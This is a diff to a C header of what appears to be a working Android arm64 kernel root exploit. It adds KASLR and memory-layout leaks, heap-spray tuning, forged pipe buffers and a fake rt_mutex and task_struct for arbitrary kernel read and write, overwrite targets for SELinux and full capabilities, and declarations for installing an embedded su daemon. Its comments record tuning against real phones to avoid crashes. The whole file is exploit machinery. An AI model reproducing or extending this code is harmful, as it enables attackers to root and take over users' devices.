@@ -5,6 +5,64 @@
 #define __ARM 1
 
 #include "offset.h"
+#include <stdint.h>
+
+/*
+ * Per-boot randomized layout (arm64 phys/virt randomization).
+ * Capture the static target.h fallbacks first, then route the
+ * boot-randomized macros through runtime globals filled by
+ * ks_layout_init() (kprobe-measured physvirt_offset / vmemmap).
+ */
+/* Macro aliases would expand lazily *after* the #undef/#define below turns
+ * the names into runtime globals (self-assignment). Force value capture at
+ * this point instead, while target.h literals are still in effect. */
+static const uint64_t ks_target_p0_page_offset = P0_PAGE_OFFSET;
+static const uint64_t ks_target_direct_map_base = DIRECT_MAP_BASE;
+static const uint64_t ks_target_direct_map_end = DIRECT_MAP_END;
+static const uint64_t ks_target_vmemmap_start = VMEMMAP_START;
+#ifdef KERNELSNITCH_IDENTITY_START
+static const uint64_t ks_target_identity_start = KERNELSNITCH_IDENTITY_START;
+#else
+static const uint64_t ks_target_identity_start = 0xffffff8000000000ULL;
+#endif
+#ifdef KERNELSNITCH_IDENTITY_END
+static const uint64_t ks_target_identity_end = KERNELSNITCH_IDENTITY_END;
+#else
+static const uint64_t ks_target_identity_end = 0xffffffffc0000000ULL;
+#endif
+#define KS_TARGET_P0_PAGE_OFFSET (ks_target_p0_page_offset)
+#define KS_TARGET_DIRECT_MAP_BASE (ks_target_direct_map_base)
+#define KS_TARGET_DIRECT_MAP_END (ks_target_direct_map_end)
+#define KS_TARGET_VMEMMAP_START (ks_target_vmemmap_start)
+#define KS_TARGET_IDENTITY_START (ks_target_identity_start)
+#define KS_TARGET_IDENTITY_END (ks_target_identity_end)
+
+extern uint64_t ks_p0_page_offset;
+extern uint64_t ks_direct_map_base;
+extern uint64_t ks_direct_map_end;
+extern uint64_t ks_vmemmap_start;
+extern uint64_t ks_vmemmap_end;
+extern uint64_t ks_identity_start;
+extern uint64_t ks_identity_end;
+extern int ks_layout_measured;
+extern int ks_kaslr_from_kallsyms;
+void ks_layout_init(void);
+int ks_layout_measure_cfgfs(int fd);
+int ks_have_tracefs(void);
+void ks_cfgfs_probe(void);
+
+#undef P0_PAGE_OFFSET
+#define P0_PAGE_OFFSET (ks_p0_page_offset)
+#undef DIRECT_MAP_BASE
+#define DIRECT_MAP_BASE (ks_direct_map_base)
+#undef DIRECT_MAP_END
+#define DIRECT_MAP_END (ks_direct_map_end)
+#undef VMEMMAP_START
+#define VMEMMAP_START (ks_vmemmap_start)
+#undef KERNELSNITCH_IDENTITY_START
+#define KERNELSNITCH_IDENTITY_START (ks_identity_start)
+#undef KERNELSNITCH_IDENTITY_END
+#define KERNELSNITCH_IDENTITY_END (ks_identity_end)
 
 #define PAGE_SHIFT 12
 #define PAGE_SIZE (1UL << PAGE_SHIFT)
@@ -25,6 +83,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/file.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 #include <sys/prctl.h>
@@ -39,6 +98,13 @@
 #include <unistd.h>
 
 #include "kernelsnitch/utils.h"
+
+#ifndef FOPS_CONFIGFS_READ_OFF
+#define FOPS_CONFIGFS_READ_OFF FOPS_READ_ITER_OFF
+#endif
+#ifndef FOPS_CONFIGFS_WRITE_OFF
+#define FOPS_CONFIGFS_WRITE_OFF FOPS_WRITE_ITER_OFF
+#endif
 
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
@@ -68,7 +134,8 @@
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define PIPE_CANDIDATE_PAGES 8
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
-#define SKB_RECLAIM_SENDS 4
+/* ~350 free order-3 Movable pages on fresh boot; 1024 sends ≈ 97% capture. */
+#define SKB_RECLAIM_SENDS 1024
 #define FOPS_TABLE_OFF FOPS_OFF
 #define SKB_FRAG_BIAS 0
 
@@ -81,6 +148,7 @@
 #define SELINUX_KERNEL_SID 1
 #define INIT_TASK_TASKS (INIT_TASK + TASK_TASKS_OFF)
 #define SECURITY_CAPABLE_HEAD (SECURITY_HOOK_HEADS + 0x40)
+#define SIG_ENFORCE (KIMAGE_TEXT_BASE + SIG_ENFORCE_OFF)
 #define CAP_FULL 0x000001ffffffffffULL
 #define CRED_CAP_WORDS 5
 #define CRED_CAP_INHERITABLE 0
@@ -112,8 +180,8 @@
 #define PIPE_SLAB_SIZE (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB)
 #define PIPE_MIN_PARTIAL 5
 #define PIPE_CPU_PARTIAL 2
-#define PIPE_DRAIN_SLABS 15
-#define PIPE_RECLAIM_SLABS 15
+#define PIPE_DRAIN_SLABS 64
+#define PIPE_RECLAIM_SLABS 64
 #define PIPE_PARTIAL_GROUPS \
   ((PIPE_MIN_PARTIAL + PIPE_CPU_PARTIAL - 1) / PIPE_CPU_PARTIAL)
 #define PIPE_N_SLABS (PIPE_PARTIAL_GROUPS * PIPE_CPU_PARTIAL)
@@ -122,6 +190,8 @@
 #define PIPE_N_COUNT (PIPE_N_SLABS * PIPE_OBJS_PER_SLAB)
 #define PIPE_C_COUNT (PIPE_C_SLABS * PIPE_OBJS_PER_SLAB)
 #define PIPE_E_COUNT (PIPE_E_SLABS * PIPE_OBJS_PER_SLAB)
+/* PIPE_DRAIN/PIPE_RECLAIM are array maximums; the runtime drain/reclaim
+ * pipe counts (KS_PIPE_SLABS, default full) live in pipe.c. */
 #define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
 #define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
 #define PIPE_MAX_ATTEMPTS 12
@@ -153,6 +223,18 @@
 
 #define PAGE_PAYLOAD_FOPS 0
 #define PAGE_PAYLOAD_SLIDE 1
+
+/*
+ * KS_PSELECT_PAYLOAD_LOCK: park the fake rt_mutex and the fake task_struct
+ * inside the dedicated order-3 payload page instead of empty_zero_page.
+ * empty_zero_page is globally shared ZERO_PAGE memory, so rb_erase() there
+ * corrupts every untouched anonymous page and crashes zygote (init reboots
+ * the phone ~30s later).  The payload region is zeroed, which is exactly
+ * the initial state that makes rt_mutex_adjust_prio_chain take the clean
+ * rb_erase arm on its first and only attempt.
+ */
+#define PSELECT_TASK_PROBE_OFF 0x6000
+#define PSELECT_TASK_PROBE_SIZE 0x1000
 
 struct kernelsnitch_shared_state;
 
@@ -212,6 +294,9 @@ struct user_pipe_buffer {
 };
 
 extern pid_t pipe_prepare_child;
+extern int pselect_payload_lock;
+void dump_shared_zero_page(const char *tag);
+int shared_zero_dirty(void);
 extern uintptr_t page_base;
 extern uintptr_t fake_lock;
 extern uintptr_t fake_w0;
@@ -220,7 +305,11 @@ extern uintptr_t fake_parent;
 extern uintptr_t fake_right;
 extern uintptr_t fake_left;
 extern uintptr_t fake_fops;
+extern uintptr_t expected_misc_fops;
+extern size_t fops_voff;
 extern uintptr_t binwrite_target;
+#define fops_table_base() (expected_misc_fops ? expected_misc_fops : fake_fops)
+int reload_payload_base(void);
 
 extern uint32_t f_wait;
 extern uint32_t f_pi_target;
@@ -235,10 +324,17 @@ extern atomic_int punch_consume_go;
 extern atomic_int punch_consume_stop;
 extern atomic_int consumer_calls;
 extern atomic_int consumer_success;
+extern atomic_int consumer_done;
+extern atomic_int pselect_planted;
 extern atomic_int main_route_delay_usec;
 extern atomic_int cfi_stage_done;
 extern atomic_int pipe_prepare_request;
 extern atomic_int pipe_prepare_done;
+extern atomic_int pi_cleanup_done;
+extern atomic_int self_root_ok;
+extern atomic_int waiter_exited;
+extern atomic_int owner_exited;
+int ks_pi_cleanup(int fd);
 extern ssize_t cfi_write_ret;
 extern ssize_t cfi_read_ret;
 extern ssize_t cfi_read_slot_ret;
@@ -352,6 +448,7 @@ extern int opt_patch_self;
 
 int run_exploit(int argc, char **argv);
 int install_embedded_ksud(void);
+int install_embedded_su(pid_t *daemon_pid);
 void prepare_ksud_status_log(void);
 void ksud_status_note(const char *fmt, ...);
 void read_first_line(const char *path, char *buf, size_t len);
@@ -366,6 +463,10 @@ int try_cache_ashmem_path(const char *path);
 int same_rdev_path(const char *path, dev_t rdev);
 void init_ashmem_path(void);
 int open_ashmem_device(void);
+extern int g_fops_probe_fd;
+void fops_guard_start(void);
+void fops_guard_set_expect(uintptr_t expect);
+uintptr_t fops_guard_get_expect(void);
 int has_zero_byte(uintptr_t value);
 uintptr_t p0_data_alias(uintptr_t image_addr);
 uintptr_t p0_alias_image_offset(uintptr_t data_alias);
@@ -377,16 +478,27 @@ uintptr_t canon_addr(uintptr_t image_addr);
 void put64(unsigned char *p, size_t off, uint64_t value);
 void put32(unsigned char *p, size_t off, uint32_t value);
 void put_fake_fops_table(unsigned char *p, size_t off);
+void ks_neutralize_fake_fops_close(int fd);
 int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len);
 int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos);
 int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len);
+int cfgfs_lock(void);
+void cfgfs_unlock(int lfd);
 pid_t clone_child(void);
 pid_t clone_leak_child(void);
 int open_memfd(pid_t child);
 void kill_child(pid_t child);
 void close_reclaim_sockets(void);
+void ks_diag_fd(const char *tag, int fd);
+void ks_diag_table(const char *tag);
+int ks_fetch64(uintptr_t addr, uint64_t *out);
+int ks_watch_frees_events(void);
+void pselect_route_preflight(void);
+int pselect_scrub_slot(int fd);
+int reclaim_recv_fd(void);
 void setup_kernelsnitch(void);
 int kernelsnitch_collisions_ready(void);
+int kernelsnitch_collisions_done(void);
 void run_kernelsnitch_bruteforce(void);
 uintptr_t current_kernelsnitch_mm_struct(void);
 uintptr_t cleanup_kernelsnitch(void);
@@ -425,11 +537,27 @@ int hex_value(char c);
 uint64_t slide_read_stext(void);
 uint64_t slide_child_leak_stext(void);
 int slide_leak_kernel_base(void);
+/* Write kaslr_base/slide + current boot_id to a shared file (root/shell
+ * rounds) so app-uid rounds of the SAME boot can boot past the perf leak
+ * (denied to untrusted_app) without the slide fallback.  Best-effort. */
+void ks_persist_kaslr_file(void);
+/* Append DONE rc=0 to $KS_STATE_FILE synchronously from the root=1
+ * contract line's process — the tail panic beats any poller. */
+void ks_lock_contract_state(void);
+/* Capture historical panic oopses from /sys/fs/pstore into
+ * /data/local/tmp/pstore_dump inside a uid0 window.  Called both on the
+ * root=1 contract path (via ks_lock_contract_state) and at the exit tail
+ * so a SAFE abort (payload table dead before gate -> no pipe_prepare fork)
+ * also captures the previous boot's panic before this chain ends. */
+void ks_dump_pstore_best_effort(void);
 uint64_t perf_leak_text_base(void);
 
 ssize_t configfs_write_once(
     int fd, uintptr_t target, const void *data, size_t len);
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len);
+ssize_t configfs_read_once_quiet(int fd, uintptr_t target, void *data,
+                                 size_t len);
+void run_pvo_oracle(void);
 int is_kernel_ptr(uintptr_t value);
 int is_direct_ptr(uintptr_t value);
 uint64_t kernel_read64(int fd, uintptr_t target);
@@ -469,6 +597,7 @@ int pipe_phys_write(
     const void *data, size_t len);
 void forge_pipe_buffers_on_page(
     int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write);
+int pipe_clear_forged_ops(int fd);
 int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len);
 int pipe_phys_write_data(
     int fd, uintptr_t direct_addr, const void *data, size_t len);
